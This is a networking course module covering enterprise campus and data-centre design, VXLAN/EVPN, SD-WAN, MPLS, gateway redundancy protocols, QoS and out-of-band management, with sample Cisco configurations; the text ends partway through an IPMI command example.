---
title: "Module 10 — Enterprise Scale Infrastructure"
tags: [networking, enterprise, spine-leaf, vxlan, sd-wan, mpls, hsrp, vrrp, glbp, qos, oob-management, netgod]
module: 10
date: 2026-04-05
---

# Module 10 — Enterprise Scale Infrastructure

> [!info] Module Overview
> This module covers how large organisations actually build their networks — three-tier campus architecture, modern data centre spine-leaf with VXLAN overlays, SD-WAN replacing MPLS, HSRP/VRRP/GLBP for gateway redundancy, QoS for traffic prioritisation, out-of-band management for resilient device access, and network documentation standards. Every section includes engineering depth and the attacker's perspective on enterprise-scale infrastructure.

---

## 1. Three-Tier Campus Architecture

### Overview

The traditional enterprise campus network uses a three-tier hierarchical model: **Access → Distribution → Core**. This model emerged from Cisco's hierarchical design principles and remains the foundation of most enterprise campus networks today.

```
                    ┌─────────────────────────────┐
                    │           CORE               │
                    │   (High-speed backbone)      │
                    │   Core-SW-1 ── Core-SW-2     │
                    └──────────┬──────────┬────────┘
                               │          │
               ┌───────────────┘          └───────────────┐
               │                                          │
    ┌──────────┴──────────┐                 ┌─────────────┴──────────┐
    │     DISTRIBUTION     │                 │      DISTRIBUTION       │
    │   (Policy + routing) │                 │    (Policy + routing)   │
    │  Dist-SW-1 Dist-SW-2 │                 │  Dist-SW-3  Dist-SW-4  │
    └──────┬───────┬───────┘                 └──────┬────────┬────────┘
           │       │                                │        │
    ┌──────┘  ┌────┘                          ┌────┘   ┌────┘
    │         │                               │        │
┌───┴──┐  ┌──┴───┐                       ┌───┴──┐  ┌──┴───┐
│ACCESS│  │ACCESS│                       │ACCESS│  │ACCESS│
│Floor1│  │Floor2│                       │Floor3│  │Floor4│
│ SW-1 │  │ SW-2 │                       │ SW-3 │  │ SW-4 │
└──────┘  └──────┘                       └──────┘  └──────┘
  │ │ │     │ │ │                          │ │ │     │ │ │
 PCs Phones APs                           PCs Phones APs
```

### Access Layer

**Role**: Connects end devices (workstations, phones, APs, printers) to the network.

**Key functions**:
- Port security (limiting MAC addresses per port)
- 802.1X authentication (NAC)
- DHCP snooping, Dynamic ARP Inspection
- QoS marking (trust CoS/DSCP from IP phones, re-mark everything else)
- STP PortFast + BPDU Guard on all access ports
- VLAN assignment (access port per user VLAN)
- PoE for phones and APs

**Typical devices**: Cisco Catalyst 9300, 3850; Aruba 2930; Juniper EX3400

```cisco
! Access switch — representative port config
interface GigabitEthernet1/0/1
 description "Workstation Port - VLAN 10"
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
 spanning-tree portfast
 spanning-tree bpduguard enable
 ip dhcp snooping limit rate 15
 ip arp inspection limit rate 100
 storm-control broadcast level 20.00      ! Block if broadcast > 20% of link
 storm-control action shutdown
 dot1x pae authenticator
 authentication port-control auto
 no shutdown

! Uplink to distribution (dual uplinks for redundancy)
interface GigabitEthernet1/0/48
 description "Uplink to Dist-SW-1"
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30,40,99
 switchport trunk native vlan 999
 spanning-tree guard root              ! Prevent distribution switch from losing root
 ip dhcp snooping trust
 ip arp inspection trust
 no shutdown
```

### Distribution Layer

**Role**: Aggregates access layer switches, enforces policy, provides redundancy and inter-VLAN routing.

**Key functions**:
- Inter-VLAN routing (SVIs — one per VLAN)
- First-hop redundancy (HSRP/VRRP between the two distribution switches)
- Route summarisation toward the core
- QoS policy application
- ACL enforcement (security policy between VLANs)
- STP root bridge (primary for some VLANs, secondary for others — load balancing)

**Typical devices**: Cisco Catalyst 9500, 6800; Aruba 8325; Juniper EX4600 (L3 switches)

```cisco
! Distribution switch pair — inter-VLAN routing + HSRP

! SVI for VLAN 10 — user workstations
interface Vlan10
 description "User VLAN 10"
 ip address 192.168.10.3 255.255.255.0      ! Distribution SW-1 real IP
 standby version 2
 standby 10 ip 192.168.10.1               ! Virtual gateway IP (used by end devices)
 standby 10 priority 150                  ! Higher priority = active for VLAN 10
 standby 10 preempt                       ! Take over if higher-priority SW recovers
 standby 10 authentication md5 key-string HSRPSecret123
 no shutdown

! SVI for VLAN 20 — servers
interface Vlan20
 ip address 192.168.20.3 255.255.255.0
 standby version 2
 standby 20 ip 192.168.20.1
 standby 20 priority 100                  ! Lower priority for VLAN 20 (SW-2 is primary)
 standby 20 preempt
 no shutdown

! Uplink toward core
interface TenGigabitEthernet1/1/1
 description "Uplink to Core-SW-1"
 no switchport                            ! L3 routed port (not switched)
 ip address 10.255.0.1 255.255.255.252
 no shutdown

! Routing toward core (OSPF)
router ospf 1
 router-id 10.0.0.3
 network 192.168.10.0 0.0.0.255 area 1
 network 192.168.20.0 0.0.0.255 area 1
 network 10.255.0.0 0.0.0.3 area 0
 passive-interface Vlan10
 passive-interface Vlan20
```

### Core Layer

**Role**: High-speed backbone connecting distribution blocks. Provides fast, reliable transport — no policy enforcement here.

**Key functions**:
- High-speed packet forwarding (wire-rate)
- Redundancy (dual core switches, full or partial mesh between them and distribution)
- No ACLs, no complex features — just routing
- BGP/OSPF toward WAN/internet edge
- QoS remarking if needed

**Design principles**:
- Keep it simple — complexity reduces reliability
- All Layer 3 routed links (no STP at the core)
- Sub-second convergence (OSPF with BFD, EIGRP, or static)
- 10/40/100 GbE uplinks

```cisco
! Core switch — lean config
interface TenGigabitEthernet1/1/1
 description "Downlink to Dist-SW-1"
 no switchport
 ip address 10.255.0.2 255.255.255.252
 bfd interval 150 min_rx 150 multiplier 3    ! BFD for fast failure detection
 ip ospf bfd
 no shutdown

router ospf 1
 router-id 10.0.0.1
 auto-cost reference-bandwidth 100000   ! Set for 100GbE reference
 network 10.255.0.0 0.0.0.3 area 0
 network 10.255.0.4 0.0.0.3 area 0

! BFD — sub-50ms failure detection (faster than OSPF dead timer)
! bfd interval: 150ms hello, 150ms min_rx, 3 missed = 450ms detection
```

### Two-Tier Collapsed Core (Smaller Deployments)

For smaller campuses (< 1000 users), the distribution and core layers collapse into a single tier:

```
┌─────────────────────────────────────┐
│      COLLAPSED CORE/DISTRIBUTION     │
│    Core-Dist-SW-1 ── Core-Dist-SW-2 │
└────────────┬──────────────┬─────────┘
             │              │
    ┌────────┴──┐      ┌────┴───────┐
    │  ACCESS   │      │   ACCESS   │
    │  Floor 1  │      │   Floor 2  │
    └───────────┘      └────────────┘
```

---

## 2. Data Centre — Spine-Leaf Architecture

### The Problem with Three-Tier in Data Centres

Three-tier architecture (Access → Aggregation → Core) was designed for **North-South traffic** (users → servers). Modern data centre traffic is predominantly **East-West** (server → server), driven by:
- Microservices: Service A calls Service B calls Service C
- Distributed computing: MapReduce, Hadoop, Spark
- Storage replication: SAN, distributed file systems
- Container orchestration: Kubernetes pod-to-pod communication

Three-tier is inefficient for East-West because server-to-server traffic may traverse multiple tiers unnecessarily.

### Spine-Leaf Architecture

Spine-leaf provides **predictable, low-latency, non-blocking** fabric:

```
        ┌──────────────────────────────────────────────┐
        │                   SPINE LAYER                 │
        │         Spine-1           Spine-2             │
        └──┬────────┬─────────┬──────┬────────┬────────┘
           │        │         │      │        │
     ┌─────┘  ┌─────┘   ┌────┘  ┌───┘   ┌────┘
     │        │          │       │        │
  ┌──┴──┐  ┌──┴──┐  ┌───┴─┐  ┌──┴──┐  ┌──┴──┐
  │Leaf │  │Leaf │  │Leaf │  │Leaf │  │Leaf │
  │ 1   │  │ 2   │  │ 3   │  │ 4   │  │ 5   │
  └──┬──┘  └──┬──┘  └──┬──┘  └──┬──┘  └──┬──┘
     │        │          │       │        │
  Servers  Servers   Servers  Servers   Border
                                        (WAN/Internet)
```

**Key properties**:
- Every leaf connects to every spine (full mesh between layers)
- No leaf-to-leaf connections
- Every server has equal latency to every other server: exactly 2 hops (server → leaf → spine → leaf → server)
- Scale out by adding more spines (increases bandwidth) or more leaves (adds ports)
- No STP — all Layer 3 routing (OSPF or BGP in the underlay)

**Terminology**:
- **Leaf**: ToR (Top of Rack) switch. Connects to servers in the rack + connects upward to all spines.
- **Spine**: High-speed core switches. Connect to all leaves. No servers connected directly.
- **Border leaf**: Special leaf(ves) connecting to WAN, internet, and external services.

### Underlay vs Overlay

**Underlay**: The physical IP network — spine-leaf routed fabric using OSPF or BGP. Each switch has a unique loopback IP used as the VTEP (VXLAN Tunnel Endpoint).

**Overlay**: The virtual network built on top — VXLAN encapsulates tenant traffic, allowing the same Layer 2 domain to span across physical racks.

---

## 3. VXLAN — Virtual Extensible LAN

### Why VXLAN

Traditional VLANs are limited to 4094 IDs and are confined to Layer 2 — they cannot span routed boundaries. In large multi-tenant data centres (cloud providers), you need:
- **Millions of isolated tenant networks** (4094 VLANs is far too few)
- **Layer 2 adjacency across routed fabric** (tenants need their VMs in the same subnet across racks)
- **Mobility**: VMs can move between physical servers without changing their IP

VXLAN solves all three by encapsulating Layer 2 Ethernet frames inside UDP packets — enabling Layer 2 over Layer 3.

### VXLAN Packet Format

```
Original Frame:
[ Ethernet | IP | TCP | App Data ]

VXLAN Encapsulated:
┌──────────────────────────────────────────────────────────────────┐
│ Outer Ethernet Header (VTEP source MAC → next-hop MAC)          │
├──────────────────────────────────────────────────────────────────┤
│ Outer IP Header (src: source VTEP IP, dst: destination VTEP IP) │
├──────────────────────────────────────────────────────────────────┤
│ Outer UDP Header (src: random port, dst: 4789)                  │
├──────────────────────────────────────────────────────────────────┤
│ VXLAN Header (8 bytes):                                         │
│   Flags: I bit = 1 (VNI valid)                                  │
│   VNI: 24-bit VXLAN Network Identifier (16 million values)      │
├──────────────────────────────────────────────────────────────────┤
│ Inner Ethernet Header (original src/dst MAC)                    │
├──────────────────────────────────────────────────────────────────┤
│ Inner IP Header + TCP + Application Data                        │
└──────────────────────────────────────────────────────────────────┘
```

**VNI (VXLAN Network Identifier)**: 24 bits → 16,777,216 unique virtual networks. Replaces VLAN ID for tenant segmentation.

**VTEP (VXLAN Tunnel Endpoint)**: The device that encapsulates and decapsulates VXLAN. Can be:
- A physical switch (hardware VTEP — Cisco Nexus, Arista, Juniper)
- A hypervisor virtual switch (software VTEP — VMware NSX, Open vSwitch)

**UDP port 4789**: The IANA-assigned port for VXLAN (some older implementations used 8472).

### VXLAN Overhead

VXLAN adds significant overhead per packet:
```
Outer Ethernet: 14 bytes
Outer IP:       20 bytes
Outer UDP:       8 bytes
VXLAN header:    8 bytes
Total overhead: 50 bytes

Original MTU (typical): 1500 bytes
VXLAN usable payload:   1450 bytes
Jumbo frames recommended: 9000-byte MTU on underlay → 8950-byte for tenant traffic
```

> [!tip] Always Enable Jumbo Frames in VXLAN Fabrics
> Configure MTU 9216 on all underlay interfaces. Without jumbo frames, every tenant packet approaching 1500 bytes requires fragmentation — significant performance impact.

### VXLAN Control Plane — Flood-and-Learn vs EVPN

**Flood-and-Learn (multicast-based)**:
- ARP and unknown unicast → flooded via IP multicast through the underlay
- Each VTEP learns MAC-to-VTEP mappings from traffic
- Simple but generates significant multicast traffic at scale
- Requires multicast in the underlay

**EVPN (Ethernet VPN — BGP-based control plane)**:
- MP-BGP (Multiprotocol BGP) distributes MAC and IP information between VTEPs
- No flooding needed — EVPN pre-populates MAC/IP tables
- ARP suppression: VTEP responds to ARP requests locally (knows the answer from BGP)
- Scales to millions of entries
- Standard: RFC 7432

```
EVPN Route Types:
Type 2: MAC/IP Advertisement — announces a MAC+IP is reachable via this VTEP
Type 3: Inclusive Multicast Route — BUM (Broadcast, Unknown Unicast, Multicast) handling
Type 5: IP Prefix Route — used for inter-subnet routing
```

### VXLAN + EVPN Configuration (Cisco Nexus)

```cisco
! Enable features
feature nv overlay
feature vn-segment-vlan-based
feature bgp

! Create VNI-to-VLAN mapping
vlan 100
 vn-segment 10100        ! VLAN 100 maps to VNI 10100

! VTEP interface (NVE = Network Virtualization Edge)
interface nve1
 no shutdown
 source-interface loopback0   ! VTEP IP address
 host-reachability protocol bgp   ! Use EVPN (BGP) control plane
 member vni 10100
  suppress-arp              ! ARP suppression — respond locally
  ingress-replication protocol bgp   ! Unicast head-end replication

! BGP EVPN
router bgp 65000
 address-family l2vpn evpn
  advertise-pip             ! Advertise per-interface (primary) IP

 neighbor 10.0.0.1 remote-as 65000   ! Spine as route reflector
  address-family l2vpn evpn
   send-community extended
   route-reflector-client   ! On spine only

! Verify
show nve vni                    ! VNI to VTEP mappings
show bgp l2vpn evpn             ! EVPN BGP table
show mac address-table          ! MAC table with VNI info
```

---

## 4. SD-WAN — Software-Defined WAN

### Why SD-WAN Replaces MPLS

**Traditional MPLS WAN**:
```
Branch Office → MPLS Circuit (ISP-managed) → HQ
- Expensive: £500–5000/month per circuit
- Long provisioning: 30–90 days
- Fixed bandwidth: hard to scale up/down
- Single provider: vendor lock-in
- Internet access backhauled to HQ: adds latency for cloud apps
```

**SD-WAN**:
```
Branch Office → Multiple links (MPLS + internet + 4G/5G) → SD-WAN Overlay → HQ
                                                                          → Internet
                                                                          → Cloud (Azure/AWS)
- Cheaper: uses commodity internet links
- Application-aware: route Office 365 direct to internet, SAP through MPLS
- Active-active: use all links simultaneously (not just failover)
- Zero-touch provisioning: ship device to branch, it calls home and configures
- Centralised management: single pane of glass for all sites
```

### SD-WAN Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    SD-WAN ORCHESTRATOR                           │
│              (Cloud or on-premise management)                    │
└──────────────────────┬──────────────────────────────────────────┘
                       │ Management plane (HTTPS/NETCONF)
       ┌───────────────┼────────────────────┐
       │               │                    │
┌──────┴──────┐  ┌──────┴──────┐  ┌─────────┴─────┐
│  HQ/DC      │  │   Branch 1  │  │   Branch 2    │
│  SD-WAN GW  │  │  SD-WAN CPE │  │  SD-WAN CPE   │
│  (vEdge/Hub)│  │  (vEdge)    │  │  (vEdge)      │
└──────┬──────┘  └──────┬──────┘  └──────┬─────────┘
       │                │                │
       │  ════ IPsec/SD-WAN Overlay (Data Plane) ════
       │                │                │
  MPLS + Internet   MPLS + Internet  4G + Internet
  (Multiple underlay transports)
```

**Three planes**:
- **Management plane**: Orchestrator — zero-touch provisioning, policy, monitoring
- **Control plane**: vSmart controllers — distribute routing info and policy via OMP (Overlay Management Protocol)
- **Data plane**: vEdge/cEdge routers — forward traffic, enforce QoS/security policy

### SD-WAN Key Features

**Application-aware routing**: Route specific applications over specific links based on performance metrics.
```
Policy: If application = Office365 → route via internet (direct)
        If application = SAP/ERP   → route via MPLS (guaranteed latency < 30ms)
        If MPLS SLA breached        → failover to internet immediately
```

**SLA monitoring**: Continuously measure latency, jitter, and packet loss on each underlay link. Switch traffic if SLA thresholds breached.

**Zero-touch provisioning (ZTP)**:
```
1. Branch SD-WAN device ships to office
2. Staff plug in power + WAN cable
3. Device contacts bootstrap server (DHCP option 43 or hardcoded)
4. Orchestrator authenticates device (serial number + certificate)
5. Full config pushed automatically
6. Site up in 30 minutes vs 30 days for MPLS provisioning
```

### SD-WAN Vendors

| Vendor | Product | Acquisition |
|--------|---------|-------------|
| Cisco | Catalyst SD-WAN (formerly Viptela) | Acquired Viptela 2017 |
| VMware | SD-WAN (formerly VeloCloud) | Acquired VeloCloud 2017 |
| Fortinet | FortiSASE / SD-WAN | Native development |
| Palo Alto | Prisma SD-WAN (formerly CloudGenix) | Acquired 2020 |
| Juniper | Session Smart Router | Acquired 128 Technology 2020 |
| Zscaler | Zero Trust SD-WAN | Native SASE integration |

---

## 5. MPLS — Label Switching, PE/CE/P Routers, L2VPN vs L3VPN

### MPLS Overview

MPLS (Multiprotocol Label Switching) is a high-performance packet forwarding technology used by ISPs and large enterprises. Instead of IP destination lookups at every hop, MPLS adds a 32-bit **label** to packets — routers forward based on label, not IP address.

**Benefits over pure IP routing**:
- Faster forwarding (label lookup vs longest prefix match)
- Traffic engineering (explicit path control — bypass congested links)
- VPN services (L2VPN and L3VPN isolation)
- QoS integration (EXP bits in MPLS label)

### MPLS Label Structure

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Label (20 bits)                |Exp|S|  TTL    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Label: 20-bit forwarding label (0-3 reserved, 16+ user-defined)
Exp:   3-bit experimental (used for QoS marking — TC in RFC 5462)
S:     Bottom of Stack bit (1 = last label in stack)
TTL:   8-bit Time to Live
```

### MPLS Router Roles

```
Customer Network                     ISP MPLS Core                Customer Network
                                                                   
[Customer Router] ──CE-PE link──[PE]──[P]──[P]──[PE]──CE-PE link──[Customer Router]
      CE                        LSR   LSR  LSR   LSR                     CE

CE = Customer Edge router (customer's device, not aware of MPLS)
PE = Provider Edge router (MPLS-aware, connects to CE, runs VPN services)
P  = Provider core router (MPLS-only — no customer routing tables, just labels)
LSR = Label Switching Router (forwards based on labels)
```

**LDP (Label Distribution Protocol)**: Distributes labels between LSRs. Each LSR advertises a label for every prefix it knows about.

**RSVP-TE (Resource Reservation Protocol - Traffic Engineering)**: Establishes explicit Label Switched Paths (LSPs) with reserved bandwidth — used for traffic engineering.

### MPLS L3VPN (Most Common Enterprise VPN Service)

L3VPN provides IP routing between customer sites, isolated per customer. The ISP maintains separate routing tables (VRFs) for each customer.

```
Customer A Site 1 (10.1.0.0/24) → ISP MPLS → Customer A Site 2 (10.2.0.0/24)
Customer B Site 1 (10.1.0.0/24) → ISP MPLS → Customer B Site 2 (10.2.0.0/24)

Both customers use 10.1.0.0/24 — no conflict because:
- PE routers maintain separate VRF (Virtual Routing and Forwarding) tables per customer
- MPLS labels distinguish customer traffic in the core
- BGP with route distinguishers (RD) makes overlapping prefixes unique globally
```

**VRF Configuration (PE Router)**:
```cisco
! Create VRF for Customer A
ip vrf CUSTOMER-A
 rd 65000:100                    ! Route Distinguisher — makes prefixes globally unique
 route-target export 65000:100   ! RT export — tag routes from this VRF
 route-target import 65000:100   ! RT import — accept routes with this tag

! Assign CE-facing interface to VRF
interface GigabitEthernet0/1
 ip vrf forwarding CUSTOMER-A
 ip address 192.168.255.1 255.255.255.252

! CE routing (static or BGP per customer)
router bgp 65000
 address-family ipv4 vrf CUSTOMER-A
  neighbor 192.168.255.2 remote-as 64512    ! CE router's AS
  neighbor 192.168.255.2 activate

! Verify
show ip route vrf CUSTOMER-A                ! VRF routing table
show ip bgp vpnv4 vrf CUSTOMER-A           ! BGP VPNv4 routes
```

### MPLS L2VPN (Pseudowire / VPLS)

L2VPN provides Layer 2 connectivity between sites — appears as a direct Ethernet link between customer devices.

**Pseudowire**: Point-to-point L2 circuit over MPLS (emulates leased line or Frame Relay).

**VPLS (Virtual Private LAN Service)**: Multipoint L2 — all sites appear to be on the same Ethernet switch.

---

## 6. First-Hop Redundancy — HSRP, VRRP, GLBP

End devices (PCs, servers) need a gateway IP as their default route. If that gateway router fails, connectivity is lost. First-hop redundancy protocols (FHRP) provide a **virtual gateway IP** shared between two or more routers — if the active router fails, the standby takes over transparently.

### HSRP — Hot Standby Router Protocol (Cisco Proprietary)

**How it works**:
- Two (or more) routers share a **virtual IP** and **virtual MAC** (`0000.0C07.ACxx` where xx = group number)
- One router is **Active** — owns the virtual IP, forwards traffic
- One router is **Standby** — monitors Active via hello messages (default: 3-second interval)
- If Active fails (dead interval: 10 seconds by default): Standby becomes Active

```
End Device: default gateway = 192.168.1.1 (virtual IP)
Router 1 (Active):  real IP 192.168.1.2, virtual IP 192.168.1.1
Router 2 (Standby): real IP 192.168.1.3, no virtual IP until failover
```

**HSRP States**: Initial → Learn → Listen → Speak → Standby → Active

```cisco
! HSRPv2 configuration (supports IPv6, more groups, millisecond timers)
interface GigabitEthernet0/1
 ip address 192.168.10.2 255.255.255.0
 standby version 2
 standby 10 ip 192.168.10.1             ! Virtual IP (group 10)
 standby 10 priority 150               ! Higher = Active (default 100)
 standby 10 preempt                    ! Reclaim Active role after recovery
 standby 10 preempt delay minimum 30   ! Wait 30s before preempting
 standby 10 timers msec 200 msec 700  ! Hello 200ms, Dead 700ms (fast!)
 standby 10 authentication md5 key-string HSRPKey!
 standby 10 track 1 decrement 60       ! If tracked object fails, reduce priority by 60

! Object tracking — track WAN interface
track 1 interface GigabitEthernet0/0 line-protocol
! If WAN goes down, priority drops by 60 (150-60=90 < standby's 100 → failover)

! Verification
show standby                           ! Full HSRP status
show standby brief                     ! Summary table
show standby GigabitEthernet0/1 10    ! Specific group
```

**HSRP output example**:
```
GigabitEthernet0/1 - Group 10 (version 2)
  State is Active
    1 state change, last state change 00:05:30
  Virtual IP address is 192.168.10.1
  Active virtual MAC address is 0000.0c9f.f00a  (v2 format)
    Local virtual MAC address is 0000.0c9f.f00a (v2 default)
  Hello time 200 msec, hold time 700 msec
  Preemption enabled, delay min 30 secs
  Active router is local
  Standby router is 192.168.10.3, priority 100 (expires in 0.640 sec)
  Priority 150 (configured 150)
  Group name is "hsrp-Gi0/1-10" (default)
```

### VRRP — Virtual Router Redundancy Protocol (IEEE Standard)

VRRP (RFC 5798) is the open-standard equivalent of HSRP — interoperable between vendors.

**Differences from HSRP**:
- **Master/Backup** (not Active/Standby)
- Virtual MAC: `0000.5E00.01xx` (xx = group number)
- Priority: 1–254 (highest wins); default 100; 255 = IP owner (router with real IP = virtual IP)
- Preemption: enabled by default (unlike HSRP)
- Hello: 1 second, Dead: 3 seconds (default)
- Supports IPv6 natively (VRRPv3)

```cisco
! VRRPv3 configuration (supports both IPv4 and IPv6)
interface GigabitEthernet0/1
 ip address 192.168.10.2 255.255.255.0
 vrrp 10 address-family ipv4
  address 192.168.10.1 primary          ! Virtual IP
  priority 150                          ! Higher = Master
  preempt                               ! Default on in VRRP
  timers advertise msec 200             ! 200ms hello interval
  authentication text VRRPSecret        ! Plain text auth (MD5 in VRRPv2 via vendor extension)

! Verification
show vrrp
show vrrp brief
```

### GLBP — Gateway Load Balancing Protocol (Cisco Proprietary)

HSRP and VRRP have one active gateway — traffic from all hosts goes to one router, the other sits idle. GLBP load-balances traffic across multiple routers simultaneously.

**How GLBP works**:
- One **AVG (Active Virtual Gateway)** coordinates the group
- Multiple **AVFs (Active Virtual Forwarders)** — each assigned a different virtual MAC
- AVG assigns different virtual MACs to ARP requests — distributing load across AVFs
- All routers forward traffic (not just one)

```
Virtual IP: 192.168.10.1 (shared)
Router 1 (AVG + AVF1): virtual MAC 0007.b400.0101 → clients assigned this MAC
Router 2 (AVF2):       virtual MAC 0007.b400.0102 → other clients assigned this MAC
```

```cisco
! GLBP configuration
interface GigabitEthernet0/1
 ip address 192.168.10.2 255.255.255.0
 glbp 10 ip 192.168.10.1           ! Virtual IP
 glbp 10 priority 150              ! Higher = AVG
 glbp 10 preempt
 glbp 10 load-balancing round-robin  ! Distribute clients in round-robin
 ! Other methods: host-dependent (same client always same router), weighted

! Verification
show glbp
show glbp brief
```

### FHRP Comparison

| Feature | HSRP | VRRP | GLBP |
|---------|------|------|------|
| Standard | Cisco proprietary | IEEE (RFC 5798) | Cisco proprietary |
| Active gateways | 1 | 1 | Up to 4 |
| Load balancing | No | No | Yes |
| Default preempt | Disabled | Enabled | Disabled |
| Virtual MAC prefix | 0000.0C07.AC | 0000.5E00.01 | 0007.B400 |
| Max groups/interface | 255 | 255 | 1024 |
| IPv6 support | HSRPv2 | VRRPv3 | Yes |

---

## 7. QoS — DSCP Marking, Queuing, Voice/Video Prioritisation

### Why QoS

Without QoS, all traffic is treated equally — when the link is congested, everything is queued or dropped indiscriminately. This is catastrophic for real-time traffic:
- VoIP call drops if packet delayed > 150ms or lost > 1%
- Video conference becomes pixelated with 2% packet loss
- Interactive applications (Citrix, RDP) feel sluggish under load

QoS ensures critical traffic gets forwarded first, even when links are congested.

### DSCP — Differentiated Services Code Point

DSCP (RFC 2474) is a 6-bit field in the IP header (part of the former ToS byte) used to mark traffic priority. 64 possible values (0–63).

**Key DSCP values**:
| DSCP Value | Binary | Name | PHB | Use Case |
|-----------|--------|------|-----|---------|
| 0 | 000000 | Default | BE (Best Effort) | General internet traffic |
| 8 | 001000 | CS1 | Scavenger | Low priority (backups, P2P) |
| 10 | 001010 | AF11 | Assured Forwarding | Bulk data (low priority) |
| 18 | 010010 | AF21 | Assured Forwarding | Transactional data |
| 26 | 011010 | AF31 | Assured Forwarding | Streaming multimedia |
| 34 | 100010 | AF41 | Assured Forwarding | Interactive video |
| 46 | 101110 | EF | Expedited Forwarding | **VoIP RTP (highest priority data)** |
| 40 | 101000 | CS5 | Class Selector 5 | **VoIP signalling (SIP/H.323)** |
| 48 | 110000 | CS6 | Class Selector 6 | **Network control (OSPF, BGP)** |
| 56 | 111000 | CS7 | Class Selector 7 | Reserved (network critical) |

**PHB (Per-Hop Behaviour)**: Defines how a router treats packets with a given DSCP value.

**CoS (Class of Service)**: 3-bit field in 802.1Q VLAN tag — used at Layer 2 (within the campus). Maps to DSCP at Layer 3 boundaries.

### QoS Trust Boundary

```
IP Phone (marks DSCP 46)
     │
     │ Trust IP Phone's DSCP marking
     ▼
Access Switch (trust boundary)
     │ ← Untrusted below here — remark everything
     │ Workstations: remark to DSCP 0 (best effort) regardless of what they mark
     │ Phones: trust DSCP 46 (EF) from phone's voice VLAN
     ▼
Distribution Switch (QoS policy enforcement)
     │
     ▼
Core / WAN Edge (queue and schedule based on DSCP)
```

> [!warning] Never Trust End Devices
> If you trust DSCP markings from workstations, any user can mark their traffic DSCP 46 (EF) and get VoIP-level priority. Always re-mark untrusted traffic at the access layer.

### QoS Queuing — CBWFQ and LLQ

**CBWFQ (Class-Based Weighted Fair Queuing)**: Assigns bandwidth guarantees per class.

**LLQ (Low Latency Queuing)**: Adds a priority queue to CBWFQ. Voice traffic goes into the strict priority queue — always serviced first, before any other class.

```cisco
! ─── MARK TRAFFIC (classification) ──────────────────────────────────────────

class-map match-any VOICE-RTP
 match dscp ef                    ! DSCP 46 = voice bearer (RTP)

class-map match-any VOICE-SIGNALING
 match dscp cs5                   ! DSCP 40 = SIP/H.323

class-map match-any CRITICAL-DATA
 match dscp af31 af32 af33        ! DSCP 26,28,30 = important business apps

class-map match-any VIDEO
 match dscp af41 af42 af43        ! DSCP 34,36,38 = interactive video

class-map match-any SCAVENGER
 match dscp cs1                   ! DSCP 8 = backup/P2P (suppress during congestion)

! ─── POLICY MAP (queuing and bandwidth) ────────────────────────────────────

policy-map WAN-QOS-POLICY
 class VOICE-RTP
  priority percent 20             ! Strict priority — 20% of link for voice
                                  ! LLQ — always serviced first
 class VOICE-SIGNALING
  bandwidth percent 5             ! Guaranteed 5% for SIP/H.323
 class VIDEO
  bandwidth percent 25            ! Guaranteed 25% for video conferencing
 class CRITICAL-DATA
  bandwidth percent 25            ! Guaranteed 25% for critical apps
 class SCAVENGER
  bandwidth percent 5             ! Only 5% for scavenger — suppress when busy
 class class-default
  fair-queue                      ! CBWFQ for all other traffic
  bandwidth percent 20

! ─── APPLY TO WAN INTERFACE ──────────────────────────────────────────────────

interface Serial0/0/0            ! WAN interface
 service-policy output WAN-QOS-POLICY

! ─── VERIFICATION ────────────────────────────────────────────────────────────
show policy-map interface Serial0/0/0
! Shows: packets matched per class, dropped, queue depth
```

### Shaping vs Policing

**Policing**: Traffic above the defined rate is **dropped** (or re-marked). Bursty traffic is not buffered.
```cisco
! Police traffic to 10 Mbps
police rate 10000000 bps
  conform-action transmit
  exceed-action drop
```

**Shaping**: Traffic above the defined rate is **buffered** and sent later. Smooths bursts — less drops but adds latency and requires buffer memory.
```cisco
! Shape to 10 Mbps
traffic-shape rate 10000000
```

**When to use which**:
- ISP use policing (doesn't waste buffer memory, enforces customer SLAs strictly)
- Enterprise use shaping on WAN egress (buffer bursts to prevent drops on expensive links)

### DSCP Marking at Access Layer

```cisco
! Mark IP Phone voice traffic (trust IP Phone CoS on the voice VLAN)
interface GigabitEthernet1/0/1
 mls qos trust dscp               ! Trust DSCP from this port
 ! Or for IP phones with data VLAN behind them:
 mls qos trust cos                ! Trust CoS from IP Phone
 
! Re-mark everything from PCs (don't trust PC markings)
! At distribution layer, apply class-map to remark down to DSCP 0
class-map match-any UNTRUSTED-PC
 match access-group 100           ! ACL matching PC subnet

policy-map REMARK-PC-TRAFFIC
 class UNTRUSTED-PC
  set dscp default                ! Re-mark to DSCP 0 (best effort)

interface GigabitEthernet0/1
 service-policy input REMARK-PC-TRAFFIC
```

---

## 8. Out-of-Band Management

### Why Out-of-Band Management

In-band management uses the same network that carries production traffic. If the network fails (the very situation you need to fix), you lose management access. Out-of-band (OOB) management uses a **physically separate network** for device management — accessible even when the production network is down.

```
IN-BAND (normal):
Admin PC → Production Network → Switch/Router (SSH to management IP)
           ↑
           If this fails, can't manage the device

OUT-OF-BAND:
Admin PC → Dedicated Management Network → Console Server → Console Port → Device
                                                           ↑
           Physical serial console — always works regardless of device state
```

### OOB Components

**Console Server (Terminal Server)**:
- Aggregates serial console connections from many devices
- Provides SSH/Telnet access to each device's console
- Examples: Cyclades, Digi, Lantronix, Opengear
- Each device's RS-232 console port connects to a console server port
- Admin SSH to console server IP, select port → reach device console

```bash
# Connect to device console via Opengear console server
ssh -p 2201 admin@console-server.mgmt.local   # Port 2201 = device 1 console
ssh -p 2202 admin@console-server.mgmt.local   # Port 2202 = device 2 console

# Or use Opengear's port-based addressing
ssh admin@192.168.100.10 -t "pmshell -l port01"
```

**IPMI/iDRAC/iLO — Server Remote Management**:
- **IPMI (Intelligent Platform Management Interface)**: Standard protocol for out-of-band server management
- **iDRAC (Dell)**: Dell's IPMI implementation — web UI, virtual console, power control
- **iLO (HP)**: HP's equivalent — full remote KVM over HTTPS
- **IMM (IBM)**: IBM's IPMI implementation

```bash
# IPMI commands (ipmitool)
apt install ipmitool

# Power control
ipmitool -H 192.168.100.50 -U admin -P password power status
ipmitool -H 192.168.100.50 -U admin -P password power on
